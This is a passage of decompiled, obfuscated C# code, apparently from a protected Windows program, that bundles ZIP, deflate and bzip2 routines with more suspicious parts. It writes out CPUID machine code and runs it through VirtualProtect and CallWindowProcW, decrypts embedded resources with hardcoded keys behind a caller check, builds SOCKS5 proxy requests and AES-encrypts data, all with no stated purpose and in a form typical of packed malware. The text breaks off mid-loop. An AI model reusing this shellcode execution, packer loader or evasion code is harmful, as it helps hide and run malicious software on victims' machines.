			Class6.smethod_467(stream0_0.gclass0_0, stream0_0.stream_0, stream0_0.stream4_0, stream0_0.stream_1, stream0_0.stream_2, stream0_0.stream13_0);
			GClass0 gclass0_ = stream0_0.gclass0_0;
			Stream stream_ = stream0_0.stream_0;
			Class6.smethod_7(stream_, gclass0_);
			bool? nullable_ = stream0_0.gclass0_0.nullable_2;
			if (nullable_.HasValue)
			{
				bool bool_ = stream0_0.bool_3;
				bool? nullable_2 = stream0_0.gclass0_0.nullable_2;
				stream0_0.bool_3 = bool_ | nullable_2.Value;
			}
			stream0_0.stream4_0 = null;
			stream0_0.stream_1 = (stream0_0.stream_2 = null);
			stream0_0.stream13_0 = null;
		}
	}

	static string smethod_383(string string_0)
	{
		if (string_0.StartsWith("./"))
		{
			string_0 = string_0.Substring(2);
		}
		string_0 = string_0.Replace("/./", "/");
		string_0 = Class20.regex_0.Replace(string_0, "$1$3");
		return string_0;
	}

	static void smethod_384(GClass1 gclass1_0)
	{
		EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
		if (eventHandler_ != null)
		{
			EventArgs2 eventArgs = Class6.smethod_36(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_10 = true;
			}
		}
	}

	static void smethod_385(Class38 class38_0)
	{
		GClass2 gclass2_ = class38_0.gclass2_0;
		class38_0.gclass2_0.long_1 = 0L;
		gclass2_.long_0 = 0L;
		class38_0.gclass2_0.string_0 = null;
		class38_0.int_21 = 0;
		class38_0.int_20 = 0;
		class38_0.bool_0 = false;
		class38_0.int_19 = (class38_0.bool_1 ? Class38.int_3 : Class38.int_4);
		class38_0.gclass2_0.uint_0 = Class6.smethod_439(0u, (byte[])null, 0, 0);
		class38_0.int_22 = 0;
		Class6.smethod_375(class38_0);
		Class6.smethod_282(class38_0);
	}

	static int smethod_386(Class73.Class77 class77_0, Class73.Class75 class75_0)
	{
		int num;
		int num2;
		if ((num = Class6.smethod_366(class75_0, 9)) >= 0)
		{
			if ((num2 = class77_0.short_0[num]) >= 0)
			{
				Class6.smethod_409(class75_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class6.smethod_366(class75_0, int_)) >= 0)
			{
				num2 = class77_0.short_0[num3 | (num >> 9)];
				Class6.smethod_409(class75_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class75_0.int_2;
			num = Class6.smethod_366(class75_0, int_2);
			num2 = class77_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class6.smethod_409(class75_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class75_0.int_2;
		num = Class6.smethod_366(class75_0, int_3);
		num2 = class77_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class6.smethod_409(class75_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static void smethod_387(Stream stream_0, GClass0 gclass0_0)
	{
		Class6.smethod_497((string)null, stream_0, (string)null, gclass0_0);
	}

	static GClass0 smethod_388(string string_0, GClass1 gclass1_0)
	{
		return Class6.smethod_407(gclass1_0, string_0, (string)null);
	}

	static char smethod_389(Stream6 stream6_0)
	{
		return (char)Class6.smethod_532(stream6_0, 8);
	}

	static int smethod_390(Enum19 enum19_0, GClass2 gclass2_0)
	{
		if (gclass2_0.class43_0 == null)
		{
			throw new GException0("No Inflate State!");
		}
		return Class6.smethod_242(gclass2_0.class43_0, enum19_0);
	}

	static string smethod_391(Stream10 stream10_0)
	{
		return stream10_0.string_1;
	}

	static void smethod_392(Class53 class53_0, IPEndPoint ipendPoint_0)
	{
		class53_0.ipendPoint_0 = ipendPoint_0;
	}

	static int smethod_393(Stream3 stream3_0, byte[] byte_0, int int_0, int int_1)
	{
		if (stream3_0.bool_0)
		{
			throw new NotSupportedException();
		}
		int num = int_1 - int_0;
		int num2 = ((num > 16) ? 16 : num);
		Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
		if (num2 == num && stream3_0.long_0 > 0L && stream3_0.long_1 + int_1 == stream3_0.long_0)
		{
			stream3_0.hmacsha1_0.TransformFinalBlock(byte_0, int_0, num2);
			stream3_0.byte_1 = stream3_0.icryptoTransform_0.TransformFinalBlock(stream3_0.byte_0, 0, 16);
			stream3_0.bool_0 = true;
		}
		else
		{
			stream3_0.hmacsha1_0.TransformBlock(byte_0, int_0, num2, null, 0);
			stream3_0.icryptoTransform_0.TransformBlock(stream3_0.byte_0, 0, 16, stream3_0.byte_1, 0);
		}
		Class6.smethod_529(stream3_0, byte_0, int_0, num2);
		return num2;
	}

	static int smethod_394(GClass2 gclass2_0)
	{
		if (gclass2_0.class43_0 == null)
		{
			throw new GException0("No Inflate State!");
		}
		int result = Class6.smethod_528(gclass2_0.class43_0);
		gclass2_0.class43_0 = null;
		return result;
	}

	static void smethod_395(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
	{
		zipSegmentedStream_0.uint_0 = uint_0;
		zipSegmentedStream_0.string_2 = null;
	}

	static void smethod_396(int int_0, byte[] byte_0, Stream3 stream3_0, int int_1)
	{
		int i = int_1;
		int num2;
		for (int num = int_0 + int_1; i < byte_0.Length && i < num; i += num2)
		{
			num2 = Class6.smethod_393(stream3_0, byte_0, i, num);
		}
	}

	static void smethod_397(Stream6 stream6_0)
	{
		if (stream6_0.class34_0 == null)
		{
			return;
		}
		Stream6.Class34 class34_ = stream6_0.class34_0;
		int[] array = Class6.smethod_66(class34_, stream6_0.int_0 + 1);
		int num = 0;
		while (true)
		{
			if (num <= 255)
			{
				if (class34_.int_0[num] >= 0 && class34_.int_0[num] <= stream6_0.int_0)
				{
					num++;
					continue;
				}
				throw new Exception("BZ_DATA_ERROR");
			}
			class34_.int_5[0] = 0;
			for (num = 1; num <= 256; num++)
			{
				class34_.int_5[num] = class34_.int_0[num - 1];
			}
			for (num = 1; num <= 256; num++)
			{
				class34_.int_5[num] += class34_.int_5[num - 1];
			}
			num = 0;
			while (true)
			{
				if (num <= 256)
				{
					if (class34_.int_5[num] >= 0 && class34_.int_5[num] <= stream6_0.int_0 + 1)
					{
						num++;
						continue;
					}
					string message = $"BZ_DATA_ERROR: cftab[{num}]={class34_.int_5[num]} last={stream6_0.int_0}";
					throw new Exception(message);
				}
				num = 1;
				while (true)
				{
					if (num <= 256)
					{
						if (class34_.int_5[num - 1] <= class34_.int_5[num])
						{
							num++;
							continue;
						}
						throw new Exception("BZ_DATA_ERROR");
					}
					num = 0;
					for (int int_ = stream6_0.int_0; num <= int_; num++)
					{
						array[class34_.int_5[class34_.byte_5[num] & 0xFF]++] = num;
					}
					if (stream6_0.int_1 >= 0 && stream6_0.int_1 < array.Length)
					{
						stream6_0.int_14 = array[stream6_0.int_1];
						stream6_0.int_7 = 0;
						stream6_0.int_10 = 0;
						stream6_0.int_8 = 256;
						if (!stream6_0.bool_2)
						{
							break;
						}
						stream6_0.int_12 = 0;
						stream6_0.int_13 = 0;
						Class6.smethod_512(stream6_0);
						return;
					}
					throw new IOException("stream corrupted");
				}
				break;
			}
			break;
		}
		Class6.smethod_149(stream6_0);
	}

	static int smethod_398(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
	{
		if (short_0 != 12 && short_0 != 8)
		{
			throw new BadReadException($"  Unexpected size (0x{short_0:X4}) for InfoZip v1 extra field at position 0x{long_0:X16}");
		}
		int num = BitConverter.ToInt32(byte_0, int_0);
		gclass0_0.dateTime_1 = GClass0.dateTime_4.AddSeconds(num);
		int_0 += 4;
		num = BitConverter.ToInt32(byte_0, int_0);
		gclass0_0.dateTime_2 = GClass0.dateTime_4.AddSeconds(num);
		int_0 += 4;
		gclass0_0.dateTime_3 = DateTime.UtcNow;
		gclass0_0.bool_0 = true;
		gclass0_0.enum7_0 |= Enum7.flag_4;
		return int_0;
	}

	static void smethod_399(Class63 class63_0, Class60 class60_0)
	{
		if (Class6.smethod_256(class63_0).IndexOf(class60_0) == -1)
		{
			Class6.smethod_256(class63_0).Add(class60_0);
		}
	}

	static int smethod_400(uint uint_0, byte byte_0, GClass3 gclass3_0)
	{
		return (int)(gclass3_0.uint_1[(uint_0 ^ byte_0) & 0xFF] ^ (uint_0 >> 8));
	}

	static bool smethod_401(Class43 class43_0)
	{
		return class43_0.bool_0;
	}

	static void smethod_402(GClass1 gclass1_0)
	{
		byte[] array = new byte[2];
		gclass1_0.ReadStream.Read(array, 0, array.Length);
		short num = (short)(array[0] + array[1] * 256);
		if (num > 0)
		{
			array = new byte[num];
			gclass1_0.ReadStream.Read(array, 0, array.Length);
			string text = (gclass1_0.Comment = gclass1_0.encoding_0.GetString(array, 0, array.Length));
		}
	}

	static byte[] smethod_403(string string_0, int int_0, Class56 class56_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		if (int_0 <= 0 || int_0 > 65535 || string_0.Length > 255)
		{
			throw new ArgumentException();
		}
		byte[] array = new byte[7 + string_0.Length];
		array[0] = 5;
		array[1] = 1;
		array[2] = 0;
		array[3] = 3;
		array[4] = (byte)string_0.Length;
		Array.Copy(Encoding.ASCII.GetBytes(string_0), 0, array, 5, string_0.Length);
		Array.Copy(Class6.smethod_660(int_0, (Class54)class56_0), 0, array, string_0.Length + 5, 2);
		return array;
	}

	static void smethod_404(Stream6 stream6_0)
	{
		char c = Class6.smethod_389(stream6_0);
		char c2 = Class6.smethod_389(stream6_0);
		char c3 = Class6.smethod_389(stream6_0);
		char c4 = Class6.smethod_389(stream6_0);
		char c5 = Class6.smethod_389(stream6_0);
		char c6 = Class6.smethod_389(stream6_0);
		if (c == '\u0017' && c2 == 'r' && c3 == 'E' && c4 == '8' && c5 == 'P' && c6 == '\u0090')
		{
			Class6.smethod_199(stream6_0);
			return;
		}
		if (c == '1' && c2 == 'A' && c3 == 'Y' && c4 == '&' && c5 == 'S' && c6 == 'Y')
		{
			stream6_0.uint_0 = Class6.smethod_32(stream6_0);
			stream6_0.bool_2 = Class6.smethod_532(stream6_0, 1) == 1;
			if (stream6_0.class34_0 == null)
			{
				stream6_0.class34_0 = new Stream6.Class34(stream6_0.int_2);
			}
			Class6.smethod_448(stream6_0);
			stream6_0.gclass3_0.uint_2 = uint.MaxValue;
			stream6_0.enum11_0 = Stream6.Enum11.const_1;
			return;
		}
		stream6_0.enum11_0 = Stream6.Enum11.const_0;
		string message = $"bad block header at offset 0x{stream6_0.stream_0.Position:X}";
		throw new IOException(message);
	}

	static byte[] smethod_405(Class19 class19_0)
	{
		return class19_0.byte_0;
	}

	static string smethod_406()
	{
		return Class6.smethod_39("");
	}

	static GClass0 smethod_407(GClass1 gclass1_0, string string_0, string string_1)
	{
		string string_2 = Class6.smethod_599(string_0, string_1);
		GClass0 gclass0_ = Class6.smethod_640(string_0, string_2);
		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
		}
		return Class6.smethod_108(gclass1_0, gclass0_);
	}

	static string smethod_408(Encoding encoding_0, byte[] byte_0)
	{
		return encoding_0.GetString(byte_0, 0, byte_0.Length);
	}

	static void smethod_409(Class73.Class75 class75_0, int int_0)
	{
		class75_0.uint_0 >>= int_0;
		class75_0.int_2 -= int_0;
	}

	static void smethod_410(GClass3 gclass3_0)
	{
		gclass3_0.uint_1 = new uint[256];
		byte b = 0;
		do
		{
			uint num = b;
			for (byte b2 = 8; b2 > 0; b2 = (byte)(b2 - 1))
			{
				num = (((num & 1) != 1) ? (num >> 1) : ((num >> 1) ^ gclass3_0.uint_0));
			}
			if (gclass3_0.bool_0)
			{
				gclass3_0.uint_1[Class6.smethod_519(b)] = Class6.smethod_1(num);
			}
			else
			{
				gclass3_0.uint_1[b] = num;
			}
			b = (byte)(b + 1);
		}
		while (b != 0);
	}

	static void smethod_411(Class38 class38_0, byte[] byte_0, int int_0, int int_1)
	{
		Array.Copy(byte_0, int_0, class38_0.byte_0, class38_0.int_21, int_1);
		class38_0.int_21 += int_1;
	}

	static long smethod_412(Stream0 stream0_0)
	{
		return stream0_0.long_0;
	}

	static void smethod_413()
	{
		try
		{
			Class71.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_414(Class32 class32_0)
	{
		Class6.smethod_291(class32_0.class31_0, 24, (uint)class32_0.int_8);
		Class6.smethod_359(class32_0);
		Class6.smethod_180(class32_0);
	}

	static Stream smethod_415(long long_0, GClass0 gclass0_0, Stream stream_0)
	{
		if (gclass0_0.short_8 == 8 && gclass0_0.enum20_0 != 0)
		{
			if (Class6.smethod_157(gclass0_0.class8_0) != 0L && (long_0 <= Class6.smethod_157(gclass0_0.class8_0) || Class6.smethod_157(gclass0_0.class8_0) <= 0L))
			{
				Stream9 stream = new Stream9(stream_0, Enum22.const_0, gclass0_0.enum20_0, bool_1: true);
				if (Class6.smethod_207(gclass0_0.class8_0) > 0)
				{
					Class6.smethod_624(Class6.smethod_207(gclass0_0.class8_0), stream);
				}
				Class6.smethod_177(stream, Class6.smethod_647(gclass0_0.class8_0));
				return stream;
			}
			if (Class6.smethod_263(gclass0_0.class8_0) == null)
			{
				Class8 class8_ = gclass0_0.class8_0;
				Stream11 stream11_ = new Stream11(stream_0, gclass0_0.enum20_0, Class6.smethod_647(gclass0_0.class8_0), bool_5: true);
				Class6.smethod_367(stream11_, class8_);
				if (Class6.smethod_207(gclass0_0.class8_0) > 0)
				{
					Class6.smethod_535(Class6.smethod_263(gclass0_0.class8_0), Class6.smethod_207(gclass0_0.class8_0));
				}
				if (Class6.smethod_495(gclass0_0.class8_0) > 0)
				{
					Stream11 stream11_2 = Class6.smethod_263(gclass0_0.class8_0);
					int int_ = Class6.smethod_495(gclass0_0.class8_0);
					Class6.smethod_278(int_, stream11_2);
				}
			}
			Stream11 stream2 = Class6.smethod_263(gclass0_0.class8_0);
			stream2.method_3(stream_0);
			return stream2;
		}
		if (gclass0_0.short_8 == 12)
		{
			if (Class6.smethod_157(gclass0_0.class8_0) != 0L && (long_0 <= Class6.smethod_157(gclass0_0.class8_0) || Class6.smethod_157(gclass0_0.class8_0) <= 0L))
			{
				return new Stream7(stream_0, bool_1: true);
			}
			return new Stream8(stream_0, bool_4: true);
		}
		return stream_0;
	}

	static bool smethod_416(Class81 class81_0)
	{
		return IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners().Any((IPEndPoint ipendPoint_0) => ipendPoint_0.Port == class81_0.method_0().method_4());
	}

	static int smethod_417(bool bool_0, GClass2 gclass2_0, int int_0)
	{
		gclass2_0.int_4 = int_0;
		if (gclass2_0.class38_0 != null)
		{
			throw new GException0("You may not call InitializeInflate() after calling InitializeDeflate().");
		}
		gclass2_0.class43_0 = new Class43(bool_0);
		return Class6.smethod_657(int_0, gclass2_0.class43_0, gclass2_0);
	}

	static int smethod_418(Class31 class31_0)
	{
		return class31_0.int_0;
	}

	static GClass1 smethod_419(string string_0)
	{
		return Class6.smethod_58(string_0, (TextWriter)null, (Encoding)null, (EventHandler<EventArgs1>)null);
	}

	static uint smethod_420(uint uint_0, GClass3 gclass3_0, uint[] uint_1)
	{
		uint num = 0u;
		int num2 = 0;
		while (uint_0 != 0)
		{
			if ((uint_0 & 1) == 1)
			{
				num ^= uint_1[num2];
			}
			uint_0 >>= 1;
			num2++;
		}
		return num;
	}

	static byte[] smethod_421(byte[] byte_0, byte[] byte_1, Form1 form1_0)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, form1_0.byte_1, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_1, 0, byte_1.Length);
		}
		return memoryStream.ToArray();
	}

	static bool smethod_422(ref byte[] byte_0)
	{
		byte[] array = new byte[26]
		{
			85, 137, 229, 87, 139, 125, 16, 106, 1, 88,
			83, 15, 162, 137, 7, 137, 87, 4, 91, 95,
			137, 236, 93, 194, 16, 0
		};
		byte[] array2 = new byte[19]
		{
			83, 72, 199, 192, 1, 0, 0, 0, 15, 162,
			65, 137, 0, 65, 137, 80, 4, 91, 195
		};
		int int_;
		if (Class6.smethod_114())
		{
			IntPtr intptr_ = new IntPtr(array2.Length);
			if (!Class6.VirtualProtect(array2, intptr_, 64, out int_))
			{
				Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
			}
			return Class6.CallWindowProcW(intptr_1: new IntPtr(byte_0.Length), byte_0: array2, intptr_0: IntPtr.Zero, int_0: 0, byte_1: byte_0) != IntPtr.Zero;
		}
		IntPtr intptr_3 = new IntPtr(array.Length);
		if (!Class6.VirtualProtect(array, intptr_3, 64, out int_))
		{
			Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
		}
		return Class6.CallWindowProcW(intptr_1: new IntPtr(byte_0.Length), byte_0: array, intptr_0: IntPtr.Zero, int_0: 0, byte_1: byte_0) != IntPtr.Zero;
	}

	static void smethod_423(string string_0, GClass0 gclass0_0, Enum3 enum3_0)
	{
		gclass0_0.ExtractExistingFile = enum3_0;
		Class6.smethod_497(string_0, (Stream)null, ".", gclass0_0);
	}

	static void smethod_424(string string_0, GClass0 gclass0_0)
	{
		Class6.smethod_497(string_0, (Stream)null, ".", gclass0_0);
	}

	static void smethod_425(GClass0 gclass0_0)
	{
		gclass0_0.long_4 = gclass0_0.long_5;
	}

	static byte[] smethod_426(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class6.smethod_83(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class73.Stream14 stream = new Class73.Stream14(byte_0);
		byte[] array = new byte[0];
		int num = Class6.smethod_272(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class6.smethod_469(stream);
			int num3 = Class6.smethod_469(stream);
			int num4 = Class6.smethod_469(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class6.smethod_272(stream);
			Class6.smethod_272(stream);
			Class6.smethod_272(stream);
			int num5 = Class6.smethod_272(stream);
			int num6 = Class6.smethod_469(stream);
			int num7 = Class6.smethod_469(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class73.Class74 class74_ = new Class73.Class74(array2);
			array = new byte[num5];
			Class6.smethod_151(array, array.Length, 0, class74_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class6.smethod_272(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class6.smethod_272(stream);
					num11 = Class6.smethod_272(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class73.Class74 class74_2 = new Class73.Class74(array3);
					Class6.smethod_151(array, num11, i, class74_2);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 1, 23, 78, 185, 142, 38, 139, 124 };
				byte[] byte_2 = new byte[8] { 109, 233, 175, 22, 146, 249, 17, 119 };
				using ICryptoTransform cryptoTransform = Class6.smethod_539(byte_2, byte_, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class6.smethod_426(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class6.smethod_485(byte_5, bool_0: true, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class6.smethod_426(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static GClass0 smethod_427(string string_0, GClass1 gclass1_0, string string_1)
	{
		return Class6.smethod_456(string_0, string_1, gclass1_0, Enum10.const_0);
	}

	static void smethod_428(Class13 class13_0, string string_0)
	{
		if (string_0.Length != 1 || (string_0[0] != 'D' && string_0[0] != 'F'))
		{
			throw new ArgumentException("Specify a single character: either D or F");
		}
		class13_0.char_0 = string_0[0];
	}

	static bool smethod_429(Enum8 enum8_0, ICollection<GClass0> icollection_0, uint uint_0, Class8 class8_0, Stream stream_0, string string_0)
	{
		ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
		zipSegmentedStream?.method_1(bool_2: true);
		long num = 0L;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			foreach (GClass0 item in icollection_0)
			{
				if (!item.bool_9)
				{
					Class6.smethod_369(item, (Stream)memoryStream);
				}
			}
			byte[] array = memoryStream.ToArray();
			stream_0.Write(array, 0, array.Length);
			num = array.Length;
		}
		long num2 = ((stream_0 is Stream4 stream4_) ? Class6.smethod_452(stream4_) : stream_0.Position);
		long num3 = num2 - num;
		uint num4 = zipSegmentedStream?.uint_0 ?? 0;
		long num5 = num2 - num3;
		int num6 = Class6.smethod_575(icollection_0);
		bool flag = enum8_0 == Enum8.const_3 || num6 >= 65535 || num5 > 4294967295L || num3 > 4294967295L;
		byte[] array2 = null;
		if (flag)
		{
			if (enum8_0 == Enum8.const_0)
			{
				StackFrame stackFrame = new StackFrame(1);
				if ((object)stackFrame.GetMethod()!.DeclaringType == typeof(GClass1))
				{
					throw new ZipException("The archive requires a ZIP64 Central Directory. Consider setting the ZipFile.UseZip64WhenSaving property.");
				}
				throw new ZipException("The archive requires a ZIP64 Central Directory. Consider setting the ZipOutputStream.EnableZip64 property.");
			}
			byte[] array3 = Class6.smethod_552(num3, num2, num6, uint_0);
			array2 = Class6.smethod_320(num3, num2, enum8_0, num6, string_0, class8_0);
			if (num4 != 0)
			{
				uint value = Class6.smethod_656(zipSegmentedStream, array3.Length + array2.Length);
				Array.Copy(BitConverter.GetBytes(value), 0, array3, 16, 4);
				Array.Copy(BitConverter.GetBytes(value), 0, array3, 20, 4);
				Array.Copy(BitConverter.GetBytes(value), 0, array3, 60, 4);
				Array.Copy(BitConverter.GetBytes(value), 0, array3, 72, 4);
			}
			stream_0.Write(array3, 0, array3.Length);
		}
		else
		{
			array2 = Class6.smethod_320(num3, num2, enum8_0, num6, string_0, class8_0);
		}
		if (num4 != 0)
		{
			ushort value2 = (ushort)Class6.smethod_656(zipSegmentedStream, array2.Length);
			Array.Copy(BitConverter.GetBytes(value2), 0, array2, 4, 2);
			Array.Copy(BitConverter.GetBytes(value2), 0, array2, 6, 2);
		}
		stream_0.Write(array2, 0, array2.Length);
		zipSegmentedStream?.method_1(bool_2: false);
		return flag;
	}

	static bool smethod_430(Stream12 stream12_0)
	{
		return stream12_0.enum22_0 == Enum22.const_0;
	}

	static byte[] smethod_431(Class19 class19_0)
	{
		if (!class19_0.bool_0)
		{
			Class6.smethod_35(class19_0);
		}
		return class19_0.byte_3;
	}

	static bool smethod_432(Class73.Class78 class78_0, Class73.Class75 class75_0)
	{
		while (true)
		{
			switch (class78_0.int_2)
			{
			case 5:
			{
				int int_ = Class73.Class78.int_1[class78_0.int_7];
				int num = Class6.smethod_366(class75_0, int_);
				if (num >= 0)
				{
					Class6.smethod_409(class75_0, int_);
					num += Class73.Class78.int_0[class78_0.int_7];
					while (num-- > 0)
					{
						class78_0.byte_1[class78_0.int_8++] = class78_0.byte_2;
					}
					if (class78_0.int_8 == class78_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class6.smethod_386(class78_0.class77_0, class75_0)) & -16) == 0)
				{
					class78_0.byte_1[class78_0.int_8++] = (class78_0.byte_2 = (byte)num2);
					if (class78_0.int_8 == class78_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class78_0.byte_2 = 0;
					}
					class78_0.int_7 = num2 - 16;
					class78_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class78_0.int_8 < class78_0.int_5)
				{
					int num3 = Class6.smethod_366(class75_0, 3);
					if (num3 >= 0)
					{
						Class6.smethod_409(class75_0, 3);
						class78_0.byte_0[Class73.Class78.int_9[class78_0.int_8]] = (byte)num3;
						class78_0.int_8++;
						continue;
					}
					return false;
				}
				class78_0.class77_0 = new Class73.Class77(class78_0.byte_0);
				class78_0.byte_0 = null;
				class78_0.int_8 = 0;
				class78_0.int_2 = 4;
				goto case 4;
			case 2:
				class78_0.int_5 = Class6.smethod_366(class75_0, 4);
				if (class78_0.int_5 >= 0)
				{
					class78_0.int_5 += 4;
					Class6.smethod_409(class75_0, 4);
					class78_0.byte_0 = new byte[19];
					class78_0.int_8 = 0;
					class78_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class78_0.int_4 = Class6.smethod_366(class75_0, 5);
				if (class78_0.int_4 >= 0)
				{
					class78_0.int_4++;
					Class6.smethod_409(class75_0, 5);
					class78_0.int_6 = class78_0.int_3 + class78_0.int_4;
					class78_0.byte_1 = new byte[class78_0.int_6];
					class78_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class78_0.int_3 = Class6.smethod_366(class75_0, 5);
				if (class78_0.int_3 >= 0)
				{
					class78_0.int_3 += 257;
					Class6.smethod_409(class75_0, 5);
					class78_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class78_0.int_2 = 4;
		}
	}

	static Class52 smethod_433(string string_0, Delegate6 delegate6_0, Class53 class53_0)
	{
		try
		{
			Dns.BeginResolve(string_0, class53_0.method_0, class53_0);
			return new Class52();
		}
		catch
		{
			throw new SocketException();
		}
	}

	static bool smethod_434(short[] short_0, int int_0, int int_1, sbyte[] sbyte_0)
	{
		short num = short_0[int_0 * 2];
		short num2 = short_0[int_1 * 2];
		if (num >= num2)
		{
			if (num == num2)
			{
				return sbyte_0[int_0] <= sbyte_0[int_1];
			}
			return false;
		}
		return true;
	}

	static void smethod_435(Class73.Class76 class76_0, int int_0, int int_1)
	{
		if ((class76_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class76_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class76_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class76_0.byte_0, num, class76_0.byte_0, class76_0.int_0, int_0);
				class76_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class76_0.byte_0[class76_0.int_0++] = class76_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class6.smethod_664(class76_0, num, int_0, int_1);
		}
	}

	static void smethod_436(Form1 form1_0)
	{
		Thread thread = new Thread(form1_0.method_2)
		{
			IsBackground = false,
			Priority = ThreadPriority.Highest
		};
		thread.Start();
	}

	static void smethod_437()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class6.smethod_447;
		}
		catch
		{
		}
	}

	static void smethod_438(string string_0, GClass1 gclass1_0, TextWriter textWriter_0)
	{
		gclass1_0.string_0 = string_0;
		gclass1_0.textWriter_0 = textWriter_0;
		gclass1_0.bool_5 = true;
		gclass1_0.AddDirectoryWillTraverseReparsePoints = true;
		gclass1_0.CompressionLevel = Enum20.const_8;
		gclass1_0.ParallelDeflateThreshold = 524288L;
		Class6.smethod_510(gclass1_0);
		if (File.Exists(gclass1_0.string_0))
		{
			if (gclass1_0.FullScan)
			{
				Class6.smethod_462(gclass1_0);
			}
			else
			{
				Class6.smethod_101(gclass1_0);
			}
			gclass1_0.bool_4 = true;
		}
	}

	static uint smethod_439(uint uint_0, byte[] byte_0, int int_0, int int_1)
	{
		if (byte_0 == null)
		{
			return 1u;
		}
		uint num = uint_0 & 0xFFFFu;
		uint num2 = (uint_0 >> 16) & 0xFFFFu;
		while (int_1 > 0)
		{
			int num3 = ((int_1 < Class50.int_0) ? int_1 : Class50.int_0);
			int_1 -= num3;
			while (num3 >= 16)
			{
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num += byte_0[int_0++];
				num2 += num;
				num3 -= 16;
			}
			if (num3 != 0)
			{
				do
